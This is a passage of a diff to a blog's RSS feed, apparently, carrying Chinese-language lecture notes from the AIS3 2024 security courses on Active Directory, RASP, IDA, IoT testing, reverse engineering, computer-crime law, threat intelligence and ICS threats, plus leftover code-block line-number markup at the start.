+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【AIS3】永不停歇的競逐 - 威脅研究員與資安女力的挑戰</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_4/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_4/</guid><description>&lt;h1 id="永不停歇的競逐---威脅研究員與資安女力的挑戰">永不停歇的競逐 - 威脅研究員與資安女力的挑戰&lt;/h1>
+&lt;p>&lt;code>-TXOne Networks Inc. 威脅研究經理 Mars Cheng ＆ DEVCORE 技術專案經理 Hazel Yen&lt;/code>&lt;/p>
+&lt;h2 id="txone-介紹">TXOne 介紹&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>OT security issue&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>OT security market&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="mars">Mars&lt;/h2>
+&lt;h3 id="學生時期">學生時期&lt;/h3>
+&lt;ul>
+&lt;li>reverse engineering with SDR&lt;/li>
+&lt;/ul>
+&lt;h3 id="就業時期">就業時期&lt;/h3>
+&lt;ul>
+&lt;li>國家資通安全研究院 資安工程師
+&lt;ul>
+&lt;li>工控&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>趨勢科技
+&lt;ul>
+&lt;li>資安威脅研究員&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>TXOne
+&lt;ul>
+&lt;li>威脅研究經理&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>CCPA&lt;/p>
+&lt;ul>
+&lt;li>手機鑑識&lt;/li>
+&lt;/ul>
+&lt;p>無法補洞 -&amp;gt; 高強度監控&lt;/p></description></item><item><title>【AIS3】深入淺出網域(AD)安全:細探各項AD組態設定的濫用</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_1/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_1/</guid><description>&lt;h1 id="深入淺出網域ad安全細探各項ad組態設定的濫用">深入淺出網域(AD)安全:細探各項AD組態設定的濫用&lt;/h1>
+&lt;p>&lt;code>-TXOne Networks Inc. Threat Researcher Dexter Chen&lt;/code>&lt;/p>
+&lt;h2 id="教材">教材&lt;/h2>
+&lt;ul>
+&lt;li>Windows Server 2019&lt;/li>
+&lt;li>Windows 10&lt;/li>
+&lt;li>Kali Linux&lt;/li>
+&lt;/ul>
+&lt;h2 id="active-directory">Active Directory&lt;/h2>
+&lt;ul>
+&lt;li>Windows Domain Service&lt;/li>
+&lt;li>LDAP(Lightweight Directory Access Protocol) + Kerberos(MS ver.) + DNS&lt;/li>
+&lt;li>SSO Services (Base on Kerberos)&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://cdn.ttgtmedia.com/rms/onlineImages/windowsserver-domain_forest_configuration-f_mobile.png" alt="image">&lt;/p>
+&lt;h2 id="ad-overview">AD Overview&lt;/h2>
+&lt;ul>
+&lt;li>Active Directory (AD) - Directory Service&lt;/li>
+&lt;li>Domain Controller (DC)
+&lt;ul>
+&lt;li>某台存著 AD 資料庫、管理網域中 AD Object 的電腦，提供驗證服務&lt;/li>
+&lt;li>Domain Directory 存在 DC&lt;/li>
+&lt;li>一個網域可以有多個 DC&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Object&lt;/li>
+&lt;li>Attribute&lt;/li>
+&lt;li>Forest&lt;/li>
+&lt;/ul>
+&lt;h2 id="ldap-overview">LDAP Overview&lt;/h2>
+&lt;ul>
+&lt;li>LDAP Path
+&lt;ul>
+&lt;li>DN(Distinguished Name)&lt;/li>
+&lt;li>RDN(Relative Distinguished Name)&lt;/li>
+&lt;li>CN(Common Name)&lt;/li>
+&lt;li>OU(Organizational Unit Name)&lt;/li>
+&lt;li>DC(Domain Component)&lt;/li>
+&lt;li>O(Organizational Unit)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="user-computer-and-group">User, Computer, and Group&lt;/h2>
+&lt;ul>
+&lt;li>Account
+&lt;ul>
+&lt;li>User Account
+&lt;ul>
+&lt;li>Person or service account&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Computer Account&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Group
+&lt;ul>
+&lt;li>Active Directory objects that contain users, contacts, computers, and other groups&lt;/li>
+&lt;li>Group Policy 作用於 User, Computer Accounts&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="security-identifier-sid">Security Identifier (SID)&lt;/h2>
+&lt;ul>
+&lt;li>識別唯一安全原則或安全群組&lt;/li>
+&lt;li>可以代表 User, Group, Computer&lt;/li>
+&lt;/ul>
+&lt;h2 id="active-directory-database">Active Directory Database&lt;/h2>
+&lt;ul>
+&lt;li>AD DS database (NTDS.DIT)&lt;/li>
+&lt;li>每個 DC 都有一個 NTDS.DIT&lt;/li>
+&lt;/ul>
+&lt;h2 id="gpo">GPO&lt;/h2>
+&lt;ul>
+&lt;li>Virtual collection of policy settings&lt;/li>
+&lt;li>政策設定影響 User, Computer&lt;/li>
+&lt;li>SYSVOL folder
+&lt;ul>
+&lt;li>\\\domainname.local\SYSVOL&lt;/li>
+&lt;li>\\\dc.local\sysvol\\\DC_FQDN\\\&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab01">Lab01&lt;/h2>
+&lt;ul>
+&lt;li>Windows Server 2019&lt;/li>
+&lt;/ul>
+&lt;p>build AD DC Script&lt;/p></description></item><item><title>【AIS3】網頁動態安全檢測與報戶 (RASP)</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_2/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_2/</guid><description>&lt;h1 id="網頁動態安全檢測與報戶-rasp">網頁動態安全檢測與報戶 (RASP)&lt;/h1>
+&lt;p>&lt;code>-中華資安國際 資安研究員 zodius&lt;/code>&lt;/p>
+&lt;p>Lab: &lt;a href="https://github.com/zodius/rasp-lab">https://github.com/zodius/rasp-lab&lt;/a>&lt;/p>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;h3 id="防護邊界">防護邊界&lt;/h3>
+&lt;ul>
+&lt;li>firewall&lt;/li>
+&lt;li>WAF&lt;/li>
+&lt;li>IPS&lt;/li>
+&lt;/ul>
+&lt;h3 id="攻擊">攻擊&lt;/h3>
+&lt;ul>
+&lt;li>內部攻擊&lt;/li>
+&lt;li>感染設備&lt;/li>
+&lt;li>雲端服務&lt;/li>
+&lt;/ul>
+&lt;h3 id="傳統網路防護模型">傳統網路防護模型&lt;/h3>
+&lt;ul>
+&lt;li>外部檢查
+&lt;ul>
+&lt;li>DDOS&lt;/li>
+&lt;li>IPS/IDS&lt;/li>
+&lt;li>WAF&lt;/li>
+&lt;li>firewall&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>應用程式
+&lt;ul>
+&lt;li>code effort&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>端點防護
+&lt;ul>
+&lt;li>EDR/MDR&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>SOC&lt;/li>
+&lt;li>預防 vs 偵測
+&lt;ul>
+&lt;li>prevention
+&lt;ul>
+&lt;li>偵測特徵&lt;/li>
+&lt;li>缺點：混淆、新型態攻擊&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>detection
+&lt;ul>
+&lt;li>發生傷害&lt;/li>
+&lt;li>應變&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="rasp">RASP&lt;/h3>
+&lt;ul>
+&lt;li>Real-time Application Self-Protection
+&lt;ul>
+&lt;li>hook 系統底層的 instruction&lt;/li>
+&lt;li>執行前做檢核&lt;/li>
+&lt;li>四個特性
+&lt;ul>
+&lt;li>避免混淆或序列化&lt;/li>
+&lt;li>精準阻擋 - 執行前先判斷，避免誤殺&lt;/li>
+&lt;li>偵測未知漏洞 - 不使用特徵偵測&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>結合 SIEM&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="回顧計算機組織">回顧計算機組織&lt;/h3>
+&lt;p>Source -&amp;gt; Transform -&amp;gt; Intermediate -&amp;gt; Execution&lt;/p></description></item><item><title>【AIS3】IDA 不只有 F5 可以按 IDA 101, Reverse 101</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_2/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_2/</guid><description>&lt;h1 id="ida-不只有-f5-可以按-ida-101-reverse-101">IDA 不只有 F5 可以按 IDA 101, Reverse 101&lt;/h1>
+&lt;p>&lt;code>-undefined 戰隊 林祐聖 ＆ 陳兆閔 ＆ TeamT5杜浦數位安全 RD 林哲宇&lt;/code>&lt;/p>
+&lt;h2 id="ida-介紹">IDA 介紹&lt;/h2>
+&lt;ul>
+&lt;li>IDAFree/IDAPro/IDATeam&lt;/li>
+&lt;/ul>
+&lt;h3 id="如何使用-ida新手">如何使用 IDA(新手)&lt;/h3>
+&lt;ul>
+&lt;li>開 binary&lt;/li>
+&lt;li>一路按 ok&lt;/li>
+&lt;li>F5 沒反應&lt;/li>
+&lt;/ul>
+&lt;h3 id="ida-freeubuntu-fix">IDA Free@ubuntu Fix&lt;/h3>
+&lt;p>Qt套件更新&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo apt install libxcb-xinerama0
+&lt;/code>&lt;/pre>&lt;h3 id="ida-free---load">IDA Free - load&lt;/h3>
+&lt;ul>
+&lt;li>ELF/PE/MachO&lt;/li>
+&lt;li>hex view&lt;/li>
+&lt;li>disassemble&lt;/li>
+&lt;li>decompile&lt;/li>
+&lt;/ul>
+&lt;h3 id="function">function&lt;/h3>
+&lt;ul>
+&lt;li>藍 library func&lt;/li>
+&lt;li>紫 external symbol&lt;/li>
+&lt;li>白 regular func&lt;/li>
+&lt;/ul>
+&lt;p>搜尋:&lt;/p></description></item><item><title>【AIS3】IoT 檢測實務</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_3/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_3/</guid><description>&lt;h1 id="iot-檢測實務">IoT 檢測實務&lt;/h1>
+&lt;p>&lt;code>-中華資安國際 副理 王凱慶 Keniver&lt;/code>&lt;/p>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;ul>
+&lt;li>IoT 拿不到韌體 -&amp;gt; 不能逆向&lt;/li>
+&lt;/ul>
+&lt;h3 id="iot-在哪裡">IoT 在哪裡&lt;/h3>
+&lt;ul>
+&lt;li>關鍵基礎設施
+&lt;ul>
+&lt;li>環境監測&lt;/li>
+&lt;li>控制關鍵設施&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>商業
+&lt;ul>
+&lt;li>廣告系統&lt;/li>
+&lt;li>生產自動化&lt;/li>
+&lt;li>門禁系統&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>社會安全
+&lt;ul>
+&lt;li>科技執法&lt;/li>
+&lt;li>交通控制&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>家中
+&lt;ul>
+&lt;li>智慧家庭&lt;/li>
+&lt;li>醫療照顧&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>IoT 設備、惡意程式數量持續增加&lt;/p>
+&lt;h2 id="iot-生態系">IoT 生態系&lt;/h2>
+&lt;h3 id="設備產業生態系">設備產業生態系&lt;/h3>
+&lt;p>由於硬體與其程式可以被重複利用與整合於其他產品中，因此ODM 廠商可能會與多間OEM 廠商合作，進而拓展經濟規模。
+這樣的架構下ODM 的硬體與軟體會被複製到多個OEM 產品上，若ODM 廠商未建立良善的安全開發流程，而OEM 廠商也只改個Logo 就將其出品，那就可能導致&lt;del>一家烤肉萬家香&lt;/del>一個漏洞萬家通用的現象發生。&lt;/p>
+&lt;p>華為 -&amp;gt; 海康衛視 -&amp;gt; SOC -&amp;gt; 雄邁 -&amp;gt; OVM 監視器廠商&lt;/p></description></item><item><title>【AIS3】從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_4/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_4/</guid><description>&lt;h1 id="從遊戲學-windows-reverse---除了-f5-之外還有哪幾招">從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招&lt;/h1>
+&lt;p>&lt;code>-undefined 戰隊 林祐聖 ＆ 陳兆閔 ＆ TeamT5杜浦數位安全 RD 林哲宇&lt;/code>&lt;/p>
+&lt;h2 id="link-start">Link Start!&lt;/h2>
+&lt;h3 id="分析目標的五個階段">分析目標的五個階段&lt;/h3>
+&lt;ul>
+&lt;li>理想
+&lt;ul>
+&lt;li>執行方式 -&amp;gt; 分析方式 -&amp;gt; 觀察目標 -&amp;gt; 理解邏輯 -&amp;gt; 寫腳本&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>現實
+&lt;ul>
+&lt;li>跳來跳去&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="執行方式debug-能力">執行方式(Debug 能力)&lt;/h3>
+&lt;ul>
+&lt;li>作業系統版本、架構不對&lt;/li>
+&lt;li>執行環境架不起來&lt;/li>
+&lt;li>缺少相依套件&lt;/li>
+&lt;li>相依套件版本不對&lt;/li>
+&lt;/ul>
+&lt;h3 id="分析方式survey-能力">分析方式(Survey 能力)&lt;/h3>
+&lt;ul>
+&lt;li>找不到適合分析目標的工具&lt;/li>
+&lt;li>不知道目標如何實作&lt;/li>
+&lt;/ul>
+&lt;p>ex: IDA 分析 C#&lt;/p>
+&lt;h3 id="觀察目標觀察力">觀察目標(觀察力)&lt;/h3>
+&lt;ul>
+&lt;li>golang, rust&lt;/li>
+&lt;li>找不到關鍵處&lt;/li>
+&lt;li>IDA 一堆 Function&lt;/li>
+&lt;/ul>
+&lt;h3 id="理解邏輯逆向能力">理解邏輯(逆向能力)&lt;/h3>
+&lt;ul>
+&lt;li>看 Code 速度&lt;/li>
+&lt;li>理解程式在做什麼&lt;/li>
+&lt;li>猜出題者想做什麼&lt;/li>
+&lt;/ul>
+&lt;h3 id="寫腳本程式工具使用">寫腳本(程式、工具使用)&lt;/h3>
+&lt;ul>
+&lt;li>不會寫程式&lt;/li>
+&lt;li>工具不熟悉
+&lt;ul>
+&lt;li>ex: z3, pwntools, gdb script&amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>資料結構、演算法不熟
+&lt;ul>
+&lt;li>ex: 有向循環圖找一條路徑滿足特定條件&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="ctf-reverse">CTF Reverse&lt;/h3>
+&lt;ul>
+&lt;li>做以下假設幫助思考
+&lt;ul>
+&lt;li>題目一定有 flag -&amp;gt; 出題者用某種方式把 flag 藏起來&lt;/li>
+&lt;li>達到某個條件會觸發計算或驗證 flag 的操作
+&lt;ul>
+&lt;li>驗證類型：輸入正確時輸出 correct，反之 wrong&lt;/li>
+&lt;li>計算類型：執行到特定程式碼解密出 flag&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>出題者通常基於什麼做出題目的
+&lt;ul>
+&lt;li>ex: 某專案、工具、論文&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="工具">工具&lt;/h3>
+&lt;ul>
+&lt;li>Detect It Easy
+&lt;ul>
+&lt;li>確認 binary 類型&lt;/li>
+&lt;li>如何實作&lt;/li>
+&lt;li>是否加殼&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>CFF Explorer
+&lt;ul>
+&lt;li>觀察 PE 結構&lt;/li>
+&lt;li>更改結構設定&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Cheat Engine
+&lt;ul>
+&lt;li>記憶體掃描&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Process Monitor
+&lt;ul>
+&lt;li>Sysinternals kit&lt;/li>
+&lt;li>監控紀錄系統行為&lt;/li>
+&lt;li>CTF 看到以下事件可多關注
+&lt;ul>
+&lt;li>network&lt;/li>
+&lt;li>file write&lt;/li>
+&lt;li>process create&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>IDA Pro
+&lt;ul>
+&lt;li>反組譯、反編譯&lt;/li>
+&lt;li>idapython&lt;/li>
+&lt;li>plugin&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>x64dbg
+&lt;ul>
+&lt;li>x64dbgpy&lt;/li>
+&lt;li>不能 debug windows kernel -&amp;gt; windbg&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="pacman---2023-ais3-pre-exam">PACMAN - 2023 AIS3 Pre-exam&lt;/h2>
+&lt;h3 id="觀察">觀察&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>DIE 取得 PE 檔案資訊&lt;/p></description></item><item><title>【AIS3】資安倫理</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_1/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_1/</guid><description>&lt;h1 id="資安倫理">資安倫理&lt;/h1>
+&lt;p>&lt;code>-法務部調查局 調查官 陳彥后&lt;/code>&lt;/p>
+&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>去年資安人力吃緊，今年沒有改善。&lt;/p>
+&lt;p>資安事件回應、情資分析佔最多缺額&lt;/p>
+&lt;p>企業資安預算逐年提高&lt;/p>
+&lt;blockquote>
+&lt;p>這是最好的時代，也是最壞的時代&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>認清工作現實
+&lt;ul>
+&lt;li>資安的工作，絕大多數絕非學生時期的 CTF 及各式競賽&lt;/li>
+&lt;li>更多的是產品的開發及服務的提供&lt;/li>
+&lt;li>平凡到超絕 人力 -&amp;gt; 人才 -&amp;gt; 人物&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="基本法律觀念">基本法律觀念&lt;/h2>
+&lt;h3 id="前科">前科&lt;/h3>
+&lt;ul>
+&lt;li>個人資料保護法施行細則第 4 條第 6 項&lt;/li>
+&lt;li>警察刑事紀錄證明核發條例第 6 條但書另規定&lt;/li>
+&lt;li>無法申請良民證&lt;/li>
+&lt;li>無法出入境某些國家&lt;/li>
+&lt;li>從事公職及特定部分工作&lt;/li>
+&lt;/ul>
+&lt;h3 id="刑事流程">刑事流程&lt;/h3>
+&lt;h3 id="妨害電腦使用罪">妨害電腦使用罪&lt;/h3>
+&lt;ul>
+&lt;li>刑法第 358 條至第 363 條
+&lt;ul>
+&lt;li>358 - 無故輸入他人帳號密碼、破解使用電腦之保護措施或利用電腦系統之漏洞，而入侵他人之電腦&lt;/li>
+&lt;li>359 - 無故取得、刪除或變更他人之電腦資料&lt;/li>
+&lt;li>360 - 無故以電腦程式或其他電磁方式干擾他人電腦或其相關設備，致生損害於公眾或他人者，處三年以下有期徒刑、拘役或科或併科十萬元以下罰金。&lt;/li>
+&lt;li>361 - 對於公務機關之電腦或其相關設備犯前三條之罪者，加重其刑至二分之一&lt;/li>
+&lt;li>362 - 製作專供犯本章之罪之電腦程式，而供自己或他人犯本章之罪，致生損害於公眾或他人者，處五年以下有期徒刑、拘役或科或併科二十萬元以下罰金。
+&lt;ul>
+&lt;li>製作 malware&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>363 - 第 358 條至第 360 條須告訴乃論。
+&lt;ul>
+&lt;li>361, 362 非告訴乃論&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="實際案例">實際案例&lt;/h3>
+&lt;ul>
+&lt;li>自架 DDoS 提供網站，以政府單位為目標，錄製攻擊過程並放在 YT 上招攬生意&lt;/li>
+&lt;li>拿女友帳號改感情狀況&lt;/li>
+&lt;li>打進校務系統改全校成績&lt;/li>
+&lt;li>與公司人員相處不睦離職，將公司配發於公務使用電腦，私人檔案及公司相關檔案刪除&lt;/li>
+&lt;/ul>
+&lt;h3 id="個人資料保護法">個人資料保護法&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>個資&lt;/p></description></item><item><title>【AIS3】The Journey of Becoming a Vulnerability Researcher</title><link>https://ja-errorpro.codes/posts/2024/ais3_d1_1/</link><pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d1_1/</guid><description>&lt;h1 id="the-journey-of-becoming-a-vulnerability-researcher">The Journey of Becoming a Vulnerability Researcher&lt;/h1>
+&lt;p>&lt;code>-DEVCORE 資深資安研究員 楊安傑 Angelboy&lt;/code>&lt;/p>
+&lt;h3 id="案例">案例&lt;/h3>
+&lt;ul>
+&lt;li>WannaCry(Eternel Blue)&lt;/li>
+&lt;li>CrowdStrike BSOD&lt;/li>
+&lt;/ul>
+&lt;h2 id="bug-hunting">Bug Hunting&lt;/h2>
+&lt;ul>
+&lt;li>主動找尋可能的漏洞&lt;/li>
+&lt;li>漏洞可能造成的危害
+&lt;ul>
+&lt;li>Remote Command Execution&lt;/li>
+&lt;li>Privilege Escape&lt;/li>
+&lt;li>Information Disclosure&lt;/li>
+&lt;li>Denial of Service&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="vulnerability-researcher">Vulnerability Researcher&lt;/h2>
+&lt;ul>
+&lt;li>漏洞挖掘分析&lt;/li>
+&lt;li>攻擊手法研究&lt;/li>
+&lt;/ul>
+&lt;h3 id="how-to-start">How to Start&lt;/h3>
+&lt;ul>
+&lt;li>Prepare the required knowledge
+&lt;ul>
+&lt;li>計概、計組、C語言、asm、OS&lt;/li>
+&lt;li>程式設計師的自我修養&lt;/li>
+&lt;li>Binary HACKS&lt;/li>
+&lt;li>The Art of Software Security Assessment&lt;/li>
+&lt;li>台大台科交大聯合課程&lt;/li>
+&lt;li>實作&lt;/li>
+&lt;li>AIS3 MyFirstCTF&lt;/li>
+&lt;li>台灣好厲駭&lt;/li>
+&lt;li>pwn.college&lt;/li>
+&lt;li>Live Overflow&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="ctf">CTF&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>一場好的 CTF 會讓你學到技術&lt;/p></description></item><item><title>【AIS3】威脅情資＆機器學習</title><link>https://ja-errorpro.codes/posts/2024/ais3_d1_2/</link><pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d1_2/</guid><description>&lt;h1 id="威脅情資機器學習">威脅情資＆機器學習&lt;/h1>
+&lt;p>&lt;code>-奧義智慧科技 資安研究處長 陳仲寬 ＆ 資安研究員 陳憶賢 ＆ 資安研究員 黃俊嘉 ＆ 資安研究員 陳勝舢&lt;/code>&lt;/p>
+&lt;h2 id="about-the-course">About the Course&lt;/h2>
+&lt;p>We believe AI will change the landscape of cybersecurity, therefore, in this course, we would like to
+combine the AI and CTI applications.&lt;/p>
+&lt;ul>
+&lt;li>Goal:
+&lt;ul>
+&lt;li>Understand the basic concept of CTI&lt;/li>
+&lt;li>Apply ML/AI to solve CTI problems&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="威脅情資概述">威脅情資概述&lt;/h2>
+&lt;h3 id="what-is-threat-intelligence">What is Threat Intelligence?&lt;/h3>
+&lt;ul>
+&lt;li>知己知彼，百戰不殆&lt;/li>
+&lt;li>Every contact leaves a trace&lt;/li>
+&lt;/ul>
+&lt;h3 id="actionable-threat-intelligence">Actionable Threat Intelligence&lt;/h3>
+&lt;ul>
+&lt;li>情資有相當多呈現方式，不是每種場域都適合&lt;/li>
+&lt;li>有什麼樣的情資&lt;/li>
+&lt;li>如何使用情資&lt;/li>
+&lt;li>情資可應用程度&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>「公部門易受外網攻擊，成功阻擋的防禦率高」 == 屁話&lt;/p></description></item><item><title>【AIS3】面對國家級關鍵基礎設施網路攻擊威脅: 從工業控制系統到網路攻防</title><link>https://ja-errorpro.codes/posts/2024/ais3_d1_3/</link><pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d1_3/</guid><description>&lt;h1 id="面對國家級關鍵基礎設施網路攻擊威脅-從工業控制系統到網路攻防">面對國家級關鍵基礎設施網路攻擊威脅: 從工業控制系統到網路攻防&lt;/h1>
+&lt;p>&lt;code>-TXOne Networks Inc. Senior Threat Researcher Yenting Lee&lt;/code>&lt;/p>
+&lt;h2 id="關鍵基礎設施ci-與工業控制系統ics-現狀">關鍵基礎設施(CI) 與工業控制系統(ICS) 現狀&lt;/h2>
+&lt;ul>
+&lt;li>對產業特性、網路架構及相關經驗不熟悉&lt;/li>
+&lt;li>資安人員少接觸&lt;/li>
+&lt;li>不知道產業實務應優先考慮的事項&lt;/li>
+&lt;li>最初設計沒對資安做考量&lt;/li>
+&lt;/ul>
+&lt;h2 id="大綱">大綱&lt;/h2>
+&lt;ul>
+&lt;li>關鍵基礎設施&lt;/li>
+&lt;li>工業控制系統&lt;/li>
+&lt;li>ICS 攻擊策略&lt;/li>
+&lt;li>CI 防禦策略&lt;/li>
+&lt;/ul>
+&lt;h2 id="關鍵基礎設施-ci">關鍵基礎設施 (CI)&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>受到衝擊會影響國家經濟，自然環境或社會安全等設施&lt;/p>
